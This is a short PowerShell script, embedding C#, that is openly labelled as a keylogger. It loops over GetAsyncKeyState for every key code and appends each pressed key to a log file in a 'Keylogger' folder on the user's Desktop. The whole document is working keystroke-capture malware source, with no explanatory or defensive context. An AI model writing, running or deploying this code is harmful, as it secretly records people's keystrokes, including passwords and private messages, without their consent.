# Define log file location
$logfolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'Keylogger')
if (-not (Test-Path $logfolder)) {
    New-Item -ItemType Directory -Path $logfolder
}
$logfile = [System.IO.Path]::Combine($logfolder, 'keylogger_output.log')

# Start keylogging
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    public static void StartLogging() {
        string path = "$logfile";
        while (true) {
            System.Threading.Thread.Sleep(10);
            for (int i = 8; i <= 255; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    File.AppendAllText(path, ((Keys)i).ToString() + " ");
                }
            }
        }
    }
}
"@
[KeyLogger]::StartLogging()
